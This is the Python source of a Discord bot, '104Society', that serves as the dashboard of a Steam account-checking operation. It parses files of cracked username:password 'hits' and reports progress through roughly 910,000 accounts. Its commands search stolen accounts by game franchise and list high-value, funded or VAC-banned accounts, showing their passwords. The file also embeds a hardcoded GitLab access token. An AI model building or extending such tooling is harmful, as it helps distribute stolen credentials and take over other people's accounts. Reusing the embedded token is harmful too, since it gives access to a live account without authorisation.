"""
104Society — Advanced Discord Bot & Platform Telemetry System
============================================================
Application ID : 1550151403220238396
Public Key     : 262373d354f89c639d98800c4fc5712346b2c1ff194a6b4f6c591129749b3487

Supports BOTH Slash Commands (/stats, /search, /ban...) and Prefix Commands (!stats, !search...)
Full moderation suite, live GitLab runner status, hits search, and Steam store integration.
"""

import os
import sys
import json
import asyncio
import re
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Dict, Any

# Environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import discord
from discord import app_commands
from discord.ext import commands

# ── Configuration ───────────────────────────────────────────────────────────
APPLICATION_ID = 1550151403220238396
PUBLIC_KEY     = "262373d354f89c639d98800c4fc5712346b2c1ff194a6b4f6c591129749b3487"
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "").strip()

RESULTS_DIR      = Path("results")
CHECKPOINT_FILE  = RESULTS_DIR / "checkpoint.json"
HITSDC_FILE      = RESULTS_DIR / "hitsdc.txt"
HITS_ALL_FILE    = RESULTS_DIR / "hits_all_paid.txt"
HITS_TARGET_FILE = RESULTS_DIR / "hits.txt"

TOTAL_ACCOUNTS_DEFAULT = 910027

# GitLab config
GITLAB_PROJECT_ID = "86592418"
GITLAB_API_TOKEN  = os.environ.get("GITLAB_TOKEN", "glpat-HhMrQTXS-gWS0N6aLs5M_2M6MQpvOjEKdTo2emdjeg8.01.170a54h92").strip()
GITLAB_API_BASE   = "https://gitlab.com/api/v4"

STEAM_ICON   = "https://community.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png"
BOT_COLOR    = 0x5865F2   # Blurple
COLOR_GREEN  = 0x10B981   # Emerald
COLOR_PURPLE = 0xA855F7   # Violet
COLOR_ORANGE = 0xF59E0B   # Amber
COLOR_RED    = 0xEF4444   # Red
COLOR_CYAN   = 0x06B6D4   # Cyan
COLOR_GOLD   = 0xFFD700   # Gold for high value

# ── Extensive Game Series Taxonomy ──────────────────────────────────────────
GAME_SERIES: Dict[str, List[str]] = {
    "fc":          ["ea sports fc", "fc 24", "fc 25", "fc 26", "fc 27"],
    "fifa":        ["fifa 22", "fifa 23", "fifa 24", "fifa 21", "fifa 20", "fifa 19", "fifa 18", "fifa 17"],
    "pes":         ["pro evolution soccer", "pes ", "efootball", "eFootball"],
    "gta":         ["grand theft auto", "gta v", "gta 5", "gta iv", "gta vi", "san andreas", "vice city", "gta: the"],
    "rdr":         ["red dead redemption", "rdr 2", "rdr2", "red dead online"],
    "witcher":     ["the witcher 3", "the witcher 2", "the witcher:", "wild hunt", "witcher"],
    "cod":         ["call of duty", "modern warfare", "black ops", "warzone", "mw2", "mw3", "cold war"],
    "rust":        ["rust"],
    "elden":       ["elden ring", "shadow of the erdtree"],
    "souls":       ["dark souls", "sekiro", "bloodborne", "demon's souls", "armored core vi"],
    "cyberpunk":   ["cyberpunk 2077", "phantom liberty"],
    "ark":         ["ark: survival evolved", "ark: survival ascended"],
    "cs":          ["counter-strike 2", "cs:go", "counter-strike:", "cs2"],
    "godofwar":    ["god of war", "god of war ragnarok", "ragnarök"],
    "assassin":    ["assassin's creed", "valhalla", "odyssey", "origins", "mirage", "shadows", "unity", "syndicate"],
    "resident":    ["resident evil", "biohazard", "village", "re2", "re4"],
    "nba":         ["nba 2k21", "nba 2k22", "nba 2k23", "nba 2k24", "nba 2k25", "nba 2k"],
    "mortal":      ["mortal kombat 11", "mortal kombat 1", "mortal kombat x", "mk11", "mk1"],
    "tekken":      ["tekken 8", "tekken 7"],
    "forza":       ["forza horizon 5", "forza horizon 4", "forza horizon 3", "forza motorsport"],
    "nfs":         ["need for speed", "nfs unbound", "nfs heat", "nfs payback"],
    "fallout":     ["fallout 4", "fallout: new vegas", "fallout 76", "fallout 3"],
    "skyrim":      ["elder scrolls v: skyrim", "skyrim special edition", "oblivion", "morrowind"],
    "batman":      ["batman: arkham", "arkham knight", "arkham city", "arkham asylum", "arkham origins"],
    "spiderman":   ["marvel's spider-man", "miles morales", "spider-man 2", "spider man"],
    "battlefield": ["battlefield 2042", "battlefield v", "battlefield 1", "battlefield 4", "bf4", "bf1"],
    "minecraft":   ["minecraft", "dungeons", "java edition", "bedrock edition"],
    "hogwarts":    ["hogwarts legacy", "harry potter"],
    "cyberpunk":   ["cyberpunk 2077", "phantom liberty"],
    "halo":        ["halo infinite", "halo 5", "halo 4", "master chief collection", "mcc"],
    "tomb":        ["tomb raider", "rise of the tomb", "shadow of the tomb", "lara croft"],
    "hitman":      ["hitman 3", "hitman 2", "hitman:", "world of assassination"],
    "dirt":        ["dirt 5", "dirt 4", "dirt rally", "ea sports wrc"],
    "farcry":      ["far cry 6", "far cry 5", "far cry 4", "far cry 3", "far cry new dawn"],
    "watchdogs":   ["watch dogs", "watch_dogs", "legion"],
    "rainbow6":    ["rainbow six siege", "rainbow six extraction", "r6"],
    "division":    ["the division 2", "the division"],
    "ghostrecon":  ["ghost recon", "breakpoint", "wildlands"],
    "payday":      ["payday 3", "payday 2"],
    "dying":       ["dying light 2", "dying light"],
    "outriders":   ["outriders"],
    "borderlands": ["borderlands 3", "borderlands 2", "tiny tina", "wonderlands"],
    "bioshock":    ["bioshock infinite", "bioshock 2", "bioshock remastered", "bioshock"],
    "portal":      ["portal 2", "portal:", "portal with rtx"],
    "halflife":    ["half-life", "hl2", "alyx"],
    "left4dead":   ["left 4 dead", "l4d2", "l4d"],
    "alien":       ["alien: isolation", "aliens: fireteam"],
    "metro":       ["metro exodus", "metro 2033", "metro: last light"],
    "stalker":     ["stalker 2", "s.t.a.l.k.e.r", "stalker:"],
    "deathstrand": ["death stranding"],
    "last":        ["the last of us", "tlou"],
    "uncharted":   ["uncharted: legacy", "uncharted 4", "uncharted 3"],
    "monster":     ["monster hunter", "mh world", "mh rise", "wilds"],
    "dragon":      ["dragon age", "veilguard", "inquisition", "origins"],
    "masseffect":  ["mass effect", "legendary edition"],
    "dragonball":  ["dragon ball", "dbz", "xenoverse", "sparking"],
    "naruto":      ["naruto to boruto", "shinobi striker", "storm 4", "ultimate ninja"],
    "onepiece":    ["one piece", "pirate warriors"],
    "aot":         ["attack on titan", "a.o.t."],
    "persona":     ["persona 5", "persona 4", "persona 3", "atlus"],
    "yakuza":      ["yakuza", "like a dragon", "ichiban"],
    "total":       ["total war", "warhammer", "three kingdoms", "medieval"],
    "crusader":    ["crusader kings", "ck3", "ck2"],
    "hearts":      ["hearts of iron", "hoi4"],
    "stellaris":   ["stellaris"],
    "eu":          ["europa universalis"],
    "cities":      ["cities: skylines", "city"],
    "planet":      ["planet coaster", "planet zoo", "planet craft"],
    "sims":        ["the sims 4", "the sims 3", "sims"],
    "stardew":     ["stardew valley"],
    "terraria":    ["terraria"],
    "valheim":     ["valheim"],
    "subnautica":  ["subnautica"],
    "satisfactory": ["satisfactory"],
    "deeprock":    ["deep rock galactic"],
    "warhammer40k": ["warhammer 40,000", "warhammer 40k", "space marine", "darktide", "vermintide"],
    "football":    ["football manager", "fm25", "fm24", "fm23"],
    "dota":        ["dota 2"],
    "league":      ["league of legends"],
    "overwatch":   ["overwatch 2", "overwatch"],
    "apex":        ["apex legends"],
    "pubg":        ["playerunknown", "pubg"],
    "destiny":     ["destiny 2", "beyond light", "witch queen", "lightfall"],
    "warframe":    ["warframe"],
    "poe":         ["path of exile", "poe2"],
    "diablo":      ["diablo iv", "diablo 3", "diablo 2", "diablo 4"],
    "wow":         ["world of warcraft", "shadowlands", "dragonflight"],
    "ffxiv":       ["final fantasy xiv", "ff14", "ffxiv"],
    "sekiro":      ["sekiro: shadows die twice"],
    "nioh":        ["nioh 2", "nioh"],
    "ghostoftsushima": ["ghost of tsushima"],
    "horizon":     ["horizon zero dawn", "horizon forbidden west"],
    "prototype":   ["prototype 2", "prototype"],
    "injustice":   ["injustice 2", "injustice: gods among us"],
    "street":      ["street fighter 6", "street fighter v"],
    "kingdomcome": ["kingdom come: deliverance"],
    "rogue":       ["rogue legacy", "dead cells", "hades"],
    "cuphead":     ["cuphead"],
    "hollow":      ["hollow knight", "silksong"],
    "celeste":     ["celeste"],
    "ori":         ["ori and the blind forest", "ori and the will"],
    "undertale":   ["undertale", "deltarune"],
    "night":       ["nights below", "night in the woods"],
    "slay":        ["slay the spire"],
    "boltgun":     ["warhammer 40,000: boltgun"],
}

# Free title fragments for filtering in bot display
FREE_GAME_FRAGMENTS = [
    "banana", "simple sight", "crosshair v2", "scp: laboratory", "ddnet",
    "3d aim trainer", "aimlabs", "steam hearts", "spacewar", "aim lab",
    "obs studio", "minesweeper", "freeciv", "open transport tycoon",
    "counter-strike 2", "cs2", "dota 2", "team fortress 2", "warface",
    "destiny 2", "warframe", "apex legends", "fall guys", "lost ark",
    "genshin impact", "path of exile", "brawlhalla", "paladins",
    "battle.net", "server", "dedicated server", "sdk", "tool", "benchmark",
    "soundtrack", "ost ", " ost", "artbook", "wallpaper", "demo",
    "open beta", "alpha", "staging branch", "playtest",
]

FREE_APPID_SET = {
    730, 570, 440, 578080, 1172470, 1938090, 252490, 374320, 230410,
    553850, 1085660, 359550, 812220, 881020, 1284210,
    271590, 582010, 1245620,  # GTA V, Zero Hour, Elden Ring — not free but common in combos
}


def _is_free_in_bot(game_name: str) -> bool:
    gl = game_name.lower().strip()
    if not gl or gl == "none":
        return True
    if re.match(r"^\d+(\.\d+)*$", gl):
        return True
    if gl.startswith("appid "):
        return True
    for frag in FREE_GAME_FRAGMENTS:
        if frag in gl:
            return True
    junk = ["sdk", " server", "benchmark", "soundtrack", " ost", "artbook",
            "wallpaper", " demo", "open beta", "alpha", "staging", "playtest",
            "dedicated server", "workshop tool", "game tool"]
    if any(j in gl for j in junk):
        return True
    return False


# ── Data Access Helpers ─────────────────────────────────────────────────────
def read_checkpoint() -> dict:
    try:
        if CHECKPOINT_FILE.exists():
            return json.loads(CHECKPOINT_FILE.read_text("utf-8"))
    except Exception:
        pass
    return {}


def count_lines(path: Path) -> int:
    try:
        if path.exists():
            with path.open("r", encoding="utf-8", errors="ignore") as f:
                return sum(1 for _ in f)
    except Exception:
        pass
    return 0


def _parse_hitsdc_line(line: str) -> Optional[dict]:
    """Parse a single hitsdc.txt line into a structured dict. Returns None if invalid."""
    line = line.strip()
    if not line:
        return None
    parts = [p.strip() for p in line.split("|")]
    acct = parts[0] if parts else ""
    if ":" not in acct:
        return None
    user, pwd = acct.split(":", 1)

    # Extract fields
    games_part  = next((p for p in parts if "PaidGames" in p), "")
    wallet_part = next((p for p in parts if "Wallet:" in p), "")
    vac_part    = next((p for p in parts if "VAC:" in p), "")
    steamid_p   = next((p for p in parts if "SteamID:" in p), "")
    country_p   = next((p for p in parts if "Country:" in p), "")

    wallet  = wallet_part.replace("Wallet:", "").strip() if wallet_part else ""
    vac     = vac_part.replace("VAC:", "").strip() if vac_part else "CLEAN"
    steamid = steamid_p.replace("SteamID:", "").strip() if steamid_p else ""
    country = country_p.replace("Country:", "").strip() if country_p else ""

    games: List[str] = []
    if games_part and ":[" in games_part:
        bracket_content = games_part.split(":[", 1)[1]
        if "]" in bracket_content:
            bracket_content = bracket_content.rsplit("]", 1)[0]
        raw_games = bracket_content.strip()
        games = [
            g.strip() for g in raw_games.split(" | ")
            if g.strip() and not _is_free_in_bot(g.strip())
        ]

    if not games:
        return None  # Skip accounts with no paid games

    # Filter out placeholder steamid
    if steamid == "76561198000000000":
        steamid = ""

    return {
        "user":    user.strip(),
        "pass":    pwd.strip(),
        "games":   games,
        "wallet":  wallet,
        "vac":     vac,
        "steamid": steamid,
        "country": country,
        "raw":     line,
    }


def read_all_hits() -> List[dict]:
    """Read and parse entire hitsdc.txt. Returns list of valid hit dicts."""
    results = []
    try:
        if HITSDC_FILE.exists():
            with HITSDC_FILE.open("r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    parsed = _parse_hitsdc_line(line)
                    if parsed:
                        results.append(parsed)
    except Exception:
        pass
    return results


def read_recent_hits(n: int = 10) -> List[dict]:
    """Read last N valid hits from hitsdc.txt efficiently."""
    buffer: List[dict] = []
    try:
        if HITSDC_FILE.exists():
            with HITSDC_FILE.open("r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            for line in reversed(lines):
                parsed = _parse_hitsdc_line(line)
                if parsed:
                    buffer.append(parsed)
                    if len(buffer) >= n:
                        break
    except Exception:
        pass
    return buffer


def search_series_hits(series_key: str, max_results: int = 15) -> List[dict]:
    """Search hitsdc.txt for accounts owning the given game series."""
    query = series_key.lower().strip()
    # Get keyword patterns from taxonomy, fall back to raw query
    patterns = GAME_SERIES.get(query, [query])
    # Also add the query itself as a pattern
    if query not in patterns:
        patterns = [query] + patterns

    matches = []
    try:
        if HITSDC_FILE.exists():
            with HITSDC_FILE.open("r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    parsed = _parse_hitsdc_line(line)
                    if not parsed:
                        continue
                    # Match against full game names (case-insensitive)
                    matched = [g for g in parsed["games"]
                               if any(p in g.lower() for p in patterns)]
                    if matched:
                        parsed["matched"] = matched
                        matches.append(parsed)
                        if len(matches) >= max_results:
                            break
    except Exception:
        pass
    return matches


def get_hit_stats() -> dict:
    """Calculate aggregate statistics from hitsdc.txt."""
    hits = read_all_hits()
    total_games_sum = sum(len(h["games"]) for h in hits)
    with_wallet  = sum(1 for h in hits if h["wallet"] and h["wallet"] not in ("0.00 TL", ""))
    vac_banned   = sum(1 for h in hits if h["vac"] == "BANNED")
    high_value   = sum(1 for h in hits if len(h["games"]) >= 10)
    avg_games    = round(total_games_sum / max(1, len(hits)), 1)

    # Franchise breakdown
    franchise_counts: Dict[str, int] = {}
    for h in hits:
        game_str = " ".join(h["games"]).lower()
        for series_key, patterns in GAME_SERIES.items():
            if any(p in game_str for p in patterns):
                franchise_counts[series_key] = franchise_counts.get(series_key, 0) + 1

    top_franchises = sorted(franchise_counts.items(), key=lambda x: -x[1])[:10]
    return {
        "count":          len(hits),
        "total_games":    total_games_sum,
        "avg_games":      avg_games,
        "with_wallet":    with_wallet,
        "vac_banned":     vac_banned,
        "high_value":     high_value,
        "top_franchises": top_franchises,
    }


def fetch_gitlab_pipeline_status() -> dict:
    """Fetch latest pipeline status from GitLab API."""
    try:
        url = f"{GITLAB_API_BASE}/projects/{GITLAB_PROJECT_ID}/pipelines?per_page=5&order_by=id&sort=desc"
        req = urllib.request.Request(
            url,
            headers={"PRIVATE-TOKEN": GITLAB_API_TOKEN, "User-Agent": "104Society-Bot"}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            pipelines = json.loads(resp.read().decode("utf-8"))
            if not pipelines:
                return {"success": False, "error": "Pipeline bulunamadı"}
            latest = pipelines[0]
            return {
                "success":    True,
                "id":         latest.get("id"),
                "status":     latest.get("status"),
                "ref":        latest.get("ref"),
                "sha":        str(latest.get("sha", ""))[:8],
                "created_at": latest.get("created_at", ""),
                "updated_at": latest.get("updated_at", ""),
                "web_url":    latest.get("web_url", ""),
                "all":        pipelines[:5],
            }
    except Exception as e:
        return {"success": False, "error": str(e)}


def fetch_gitlab_jobs(pipeline_id: int) -> List[dict]:
    """Get jobs for a specific pipeline."""
    try:
        url = f"{GITLAB_API_BASE}/projects/{GITLAB_PROJECT_ID}/pipelines/{pipeline_id}/jobs"
        req = urllib.request.Request(
            url,
            headers={"PRIVATE-TOKEN": GITLAB_API_TOKEN, "User-Agent": "104Society-Bot"}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception:
        return []


# ── Bot Client Initialization ────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = False

bot = commands.Bot(
    command_prefix=["!", "."],
    intents=intents,
    application_id=APPLICATION_ID,
    help_command=None
)


def _truncate(text: str, limit: int = 1020) -> str:
    """Truncate text to Discord embed field limit."""
    if len(text) <= limit:
        return text
    return text[:limit - 3] + "..."


def _format_hit_embed_field(hit: dict, idx: int, show_creds: bool = True) -> tuple:
    """Build (name, value) for a single hit embed field."""
    user = hit["user"]
    pwd  = hit["pass"]
    games = hit["games"]

    name = f"#{idx} — {user} ({len(games)} Ücretli Oyun)"

    shown = games[:12]
    game_str = " | ".join(shown)
    if len(games) > 12:
        game_str += f" +{len(games) - 12} oyun daha"

    lines = []
    if show_creds:
        lines.append(f"👤 `{user}` : ||`{pwd}`||")
    if hit.get("steamid"):
        lines.append(f"🆔 SteamID: `{hit['steamid']}`")
    if hit.get("country"):
        lines.append(f"🌍 `{hit['country']}`")
    lines.append(f"🎮 **({len(games)}) Oyun:** {game_str}")
    if hit["wallet"] and hit["wallet"] not in ("0.00 TL", "0.00", ""):
        lines.append(f"💰 **Bakiye:** `{hit['wallet']}`")
    if hit["vac"] == "BANNED":
        lines.append("⚠️ **VAC: BANLI**")

    return name, _truncate("\n".join(lines))


# ────────────────────────────────────────────────────────────────────────────
# 1. VALIDATOR & TELEMETRY COMMANDS
# ────────────────────────────────────────────────────────────────────────────

@bot.hybrid_command(name="stats", description="Canlı Steam validator kontrol istatistikleri")
async def cmd_stats(ctx: commands.Context):
    await ctx.defer()  # CRITICAL — prevent timeout

    cp = read_checkpoint()
    checked     = cp.get("checked", 0)
    target_hits = cp.get("target_hits", 0)
    hits        = cp.get("hits", 0)
    two_fa      = cp.get("two_fa", 0)
    total       = cp.get("total", TOTAL_ACCOUNTS_DEFAULT) or TOTAL_ACCOUNTS_DEFAULT
    bad_count   = max(0, checked - (hits + two_fa))
    remaining   = max(0, total - checked)
    pct         = (checked / max(1, total)) * 100
    hit_rate    = (hits / max(1, checked)) * 100

    hitsdc_count = count_lines(HITSDC_FILE)

    # Aggregate stats from parsed file
    hit_stats = await asyncio.get_event_loop().run_in_executor(None, get_hit_stats)

    embed = discord.Embed(
        title="📊 104Society — Canlı Doğrulama İstatistikleri",
        color=COLOR_GREEN,
        timestamp=datetime.now(timezone.utc)
    )
    embed.add_field(name="✅ Kontrol Edilen",        value=f"**{checked:,}** / {total:,} (`%{pct:.2f}`)", inline=False)
    embed.add_field(name="⏳ Kalan Hesap",            value=f"**{remaining:,}**", inline=True)
    embed.add_field(name="💚 Geçerli HIT",            value=f"**{hits:,}** (`%{hit_rate:.2f}`)", inline=True)
    embed.add_field(name="🎯 Target HIT (FC/GTA)",    value=f"**{target_hits:,}**", inline=True)
    embed.add_field(name="🔐 2FA (Korumalı)",         value=f"**{two_fa:,}**", inline=True)
    embed.add_field(name="❌ Bad / Geçersiz",         value=f"**{bad_count:,}**", inline=True)
    embed.add_field(name="📨 Discord'a Gönderilen",   value=f"**{hitsdc_count:,}**", inline=True)
    embed.add_field(name="🏆 Ort. Ücretli Oyun/Hesap", value=f"**{hit_stats['avg_games']}**", inline=True)
    embed.add_field(name="💎 Yüksek Değer (≥10 oyun)",value=f"**{hit_stats['high_value']:,}**", inline=True)
    embed.add_field(name="💰 Bakiyeli Hesap",          value=f"**{hit_stats['with_wallet']:,}**", inline=True)
    embed.add_field(name="⚠️ VAC Banlı",              value=f"**{hit_stats['vac_banned']:,}**", inline=True)
    embed.add_field(name="🎮 Toplam Oyun Kütüphanesi", value=f"**{hit_stats['total_games']:,}**", inline=True)

    if hit_stats["top_franchises"]:
        franchise_str = " | ".join(f"**{k.upper()}**:`{v}`" for k, v in hit_stats["top_franchises"])
        embed.add_field(name="🔝 En Çok Bulunan Seriler", value=_truncate(franchise_str), inline=False)

    embed.set_thumbnail(url=STEAM_ICON)
    embed.set_footer(text="104Society Cloud & Local Engine", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="cloud", description="GitLab CI/CD 24/7 bulut koşusunun anlık durumu")
async def cmd_cloud(ctx: commands.Context):
    await ctx.defer()

    data = await asyncio.get_event_loop().run_in_executor(None, fetch_gitlab_pipeline_status)
    if not data.get("success"):
        await ctx.send(f"❌ GitLab API Hatası: `{data.get('error')}`")
        return

    st  = data["status"]
    ref = data.get("ref", "main")
    status_map = {
        "running":  ("🟢 ÇALIŞIYOR",  COLOR_GREEN),
        "success":  ("✅ BAŞARILI",    COLOR_GREEN),
        "failed":   ("❌ BAŞARISIZ",   COLOR_RED),
        "pending":  ("⏳ BEKLEMEDE",   COLOR_ORANGE),
        "canceled": ("⛔ İPTAL EDİLDİ", COLOR_RED),
        "skipped":  ("⏭️ ATLANDI",    COLOR_CYAN),
        "manual":   ("🔧 MANUEL",     COLOR_PURPLE),
    }
    label, color = status_map.get(st, (f"❓ {st.upper()}", BOT_COLOR))

    embed = discord.Embed(
        title=f"☁️ GitLab CI — {label}",
        color=color,
        timestamp=datetime.now(timezone.utc)
    )
    embed.add_field(name="Pipeline ID", value=f"[`#{data['id']}`]({data['web_url']})", inline=True)
    embed.add_field(name="Branch",      value=f"`{ref}`", inline=True)
    embed.add_field(name="Commit SHA",  value=f"`{data['sha']}`", inline=True)

    # Timestamps
    created = data.get("created_at", "")
    updated = data.get("updated_at", "")
    if created:
        embed.add_field(name="Başlangıç (UTC)", value=f"`{created[:19].replace('T', ' ')}`", inline=True)
    if updated:
        embed.add_field(name="Son Güncelleme",  value=f"`{updated[:19].replace('T', ' ')}`", inline=True)

    embed.add_field(
        name="GitLab Repo",
        value="[muhammedyol104/104society-validator](https://gitlab.com/muhammedyol104/104society-validator)",
        inline=False
    )

    # Recent pipelines
    history = []
    for p in data.get("all", [])[:5]:
        pid   = p.get("id")
        pst   = p.get("status", "?")
        purl  = p.get("web_url", "")
        pref  = p.get("ref", "")
        emoji = {"running":"🟢","success":"✅","failed":"❌","pending":"⏳","canceled":"⛔"}.get(pst, "❓")
        history.append(f"{emoji} [`#{pid}`]({purl}) — `{pst}` @ `{pref}`")
    if history:
        embed.add_field(name="Son Pipeline'lar", value="\n".join(history), inline=False)

    embed.set_footer(text="104Society 24/7 GitLab Cloud Orchestrator", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="recenthits", description="Son bulunan hit hesapları ve oyunlarını gösterir")
@app_commands.describe(count="Kaç hesap gösterilsin? (1-20)")
async def cmd_recenthits(ctx: commands.Context, count: int = 10):
    await ctx.defer()

    count = min(max(1, count), 20)
    hits  = await asyncio.get_event_loop().run_in_executor(None, lambda: read_recent_hits(count))

    if not hits:
        await ctx.send("❌ Henüz kaydedilmiş bir hit bulunamadı.")
        return

    embed = discord.Embed(
        title=f"🔥 Son {len(hits)} Hit Hesap",
        color=COLOR_ORANGE,
        timestamp=datetime.now(timezone.utc)
    )
    for i, hit in enumerate(hits, 1):
        name, value = _format_hit_embed_field(hit, i)
        embed.add_field(name=name, value=value, inline=False)
        if i >= 25:  # Discord hard limit
            break

    embed.set_footer(text=f"104Society Validator — {count_lines(HITSDC_FILE)} toplam hit", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="search", description="Belirli bir oyun veya serisine sahip hit hesapları arar")
@app_commands.describe(
    series="Oyun adı veya seri anahtarı (örn: fc, gta, rust, witcher, minecraft...)",
    amount="Kaç sonuç gösterilsin? (1-20, varsayılan 10)"
)
async def cmd_search(ctx: commands.Context, series: str, amount: int = 10):
    await ctx.defer()

    amount  = min(max(1, amount), 20)
    matches = await asyncio.get_event_loop().run_in_executor(
        None, lambda: search_series_hits(series, max_results=amount)
    )
    s_upper = series.upper()

    if not matches:
        # Try fuzzy — check if query appears anywhere in game names
        all_hits  = await asyncio.get_event_loop().run_in_executor(None, read_all_hits)
        query_lower = series.lower()
        fuzzy = [h for h in all_hits if any(query_lower in g.lower() for g in h["games"])][:amount]
        if fuzzy:
            for h in fuzzy:
                h["matched"] = [g for g in h["games"] if query_lower in g.lower()]
            matches = fuzzy

    if not matches:
        embed = discord.Embed(
            title=f"🔍 '{s_upper}' — Sonuç Bulunamadı",
            description=f"`{series}` içeren bir hit henüz `hitsdc.txt` kütüğüne düşmedi.\n"
                        f"Desteklenen seri anahtarları için `/serieslist` komutunu kullanın.",
            color=COLOR_RED
        )
        embed.set_footer(text="104Society Validator", icon_url=STEAM_ICON)
        await ctx.send(embed=embed)
        return

    color = 0xFF5500 if series.lower() in ("fc", "fifa", "pes") else COLOR_PURPLE
    embed = discord.Embed(
        title=f"🔍 '{s_upper}' — {len(matches)} Hesap Bulundu",
        color=color,
        timestamp=datetime.now(timezone.utc)
    )

    for i, hit in enumerate(matches, 1):
        user = hit["user"]
        pwd  = hit["pass"]
        matched_str = " | ".join(f"**{g}**" for g in hit.get("matched", [])[:5])
        other = [g for g in hit["games"] if g not in hit.get("matched", [])]
        other_str = " | ".join(other[:8])
        if len(other) > 8:
            other_str += f" +{len(other) - 8} oyun daha"

        lines = [f"👤 `{user}` : ||`{pwd}`||"]
        if hit.get("steamid"):
            lines.append(f"🆔 `{hit['steamid']}`")
        lines.append(f"🎯 **Eşleşen:** {matched_str}")
        if other_str:
            lines.append(f"🎮 **Diğerleri:** {other_str}")
        if hit["wallet"] and hit["wallet"] not in ("0.00 TL", "0.00", ""):
            lines.append(f"💰 **Bakiye:** `{hit['wallet']}`")
        if hit["vac"] == "BANNED":
            lines.append("⚠️ **VAC: BANLI**")

        embed.add_field(
            name=f"#{i} — {user} ({len(hit['games'])} Ücretli Oyun)",
            value=_truncate("\n".join(lines)),
            inline=False
        )
        if i >= 25:
            break

    embed.set_footer(text="104Society Validator", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="serieslist", description="Desteklenen tüm oyun serileri anahtarları")
async def cmd_serieslist(ctx: commands.Context):
    await ctx.defer()

    lines = []
    for k, v in GAME_SERIES.items():
        sample = ", ".join(f"`{x}`" for x in v[:2])
        lines.append(f"• **`{k}`** → {sample}")

    # Split into chunks of 30 each for multiple fields
    chunk = 35
    chunks = [lines[i:i+chunk] for i in range(0, len(lines), chunk)]

    embed = discord.Embed(
        title=f"🎮 Desteklenen Oyun Serileri ({len(GAME_SERIES)} seri)",
        description="`/search <seri>` veya `/search <oyun adı>` ile arama yapabilirsiniz:",
        color=COLOR_CYAN
    )
    for idx, ch in enumerate(chunks[:4]):  # Max 4 fields
        embed.add_field(
            name=f"Seriler {idx * chunk + 1}–{min((idx + 1) * chunk, len(lines))}",
            value=_truncate("\n".join(ch), 1020),
            inline=True
        )
    embed.set_footer(text="104Society Taxonomy Engine", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="hitsummary", description="Kütükteki tüm hitlerin franchise/kategori dökümü")
async def cmd_hitsummary(ctx: commands.Context):
    await ctx.defer()

    hit_stats = await asyncio.get_event_loop().run_in_executor(None, get_hit_stats)

    embed = discord.Embed(
        title="📋 Hit Kütüğü — Franchise & Kategori Analizi",
        color=COLOR_GOLD,
        timestamp=datetime.now(timezone.utc)
    )
    embed.add_field(name="📦 Toplam Kayıt",         value=f"**{hit_stats['count']:,}**", inline=True)
    embed.add_field(name="🎮 Toplam Oyun",           value=f"**{hit_stats['total_games']:,}**", inline=True)
    embed.add_field(name="📊 Ort. Oyun/Hesap",       value=f"**{hit_stats['avg_games']}**", inline=True)
    embed.add_field(name="💎 Yüksek Değer (≥10)",   value=f"**{hit_stats['high_value']:,}**", inline=True)
    embed.add_field(name="💰 Bakiyeli",              value=f"**{hit_stats['with_wallet']:,}**", inline=True)
    embed.add_field(name="⚠️ VAC Banlı",            value=f"**{hit_stats['vac_banned']:,}**", inline=True)

    if hit_stats["top_franchises"]:
        franchise_lines = [
            f"{i+1}. **{k.upper()}** — `{v}` hesap"
            for i, (k, v) in enumerate(hit_stats["top_franchises"])
        ]
        embed.add_field(
            name="🏆 En Çok Eşleşen Seriler (Top 10)",
            value="\n".join(franchise_lines),
            inline=False
        )

    embed.set_footer(text="104Society Analytics", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="highvalue", description="En çok ücretli oyuna sahip hit hesapları listeler")
@app_commands.describe(
    min_games="Minimum ücretli oyun sayısı (varsayılan: 10)",
    amount="Kaç sonuç (varsayılan: 10, max: 20)"
)
async def cmd_highvalue(ctx: commands.Context, min_games: int = 10, amount: int = 10):
    await ctx.defer()

    amount = min(max(1, amount), 20)
    all_hits = await asyncio.get_event_loop().run_in_executor(None, read_all_hits)

    # Sort by game count descending, filter by minimum
    filtered = sorted(
        [h for h in all_hits if len(h["games"]) >= min_games],
        key=lambda h: -len(h["games"])
    )[:amount]

    if not filtered:
        await ctx.send(f"❌ `{min_games}` veya daha fazla ücretli oyuna sahip hit bulunamadı.")
        return

    embed = discord.Embed(
        title=f"💎 En Değerli {len(filtered)} Hesap (≥{min_games} Oyun)",
        color=COLOR_GOLD,
        timestamp=datetime.now(timezone.utc)
    )
    for i, hit in enumerate(filtered, 1):
        name, value = _format_hit_embed_field(hit, i)
        embed.add_field(name=name, value=value, inline=False)
        if i >= 25:
            break

    embed.set_footer(text="104Society High Value Filter", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="vacbanned", description="VAC banlı hit hesaplarını listeler")
@app_commands.describe(amount="Kaç sonuç (varsayılan: 10, max: 20)")
async def cmd_vacbanned(ctx: commands.Context, amount: int = 10):
    await ctx.defer()

    amount   = min(max(1, amount), 20)
    all_hits = await asyncio.get_event_loop().run_in_executor(None, read_all_hits)
    banned   = [h for h in all_hits if h["vac"] == "BANNED"][:amount]

    if not banned:
        await ctx.send("❌ VAC banlı hesap bulunamadı.")
        return

    embed = discord.Embed(
        title=f"⚠️ VAC Banlı Hesaplar — {len(banned)} Sonuç",
        color=COLOR_RED,
        timestamp=datetime.now(timezone.utc)
    )
    for i, hit in enumerate(banned, 1):
        name, value = _format_hit_embed_field(hit, i)
        embed.add_field(name=name, value=value, inline=False)
        if i >= 25:
            break

    embed.set_footer(text="104Society VAC Filter", icon_url=STEAM_ICON)
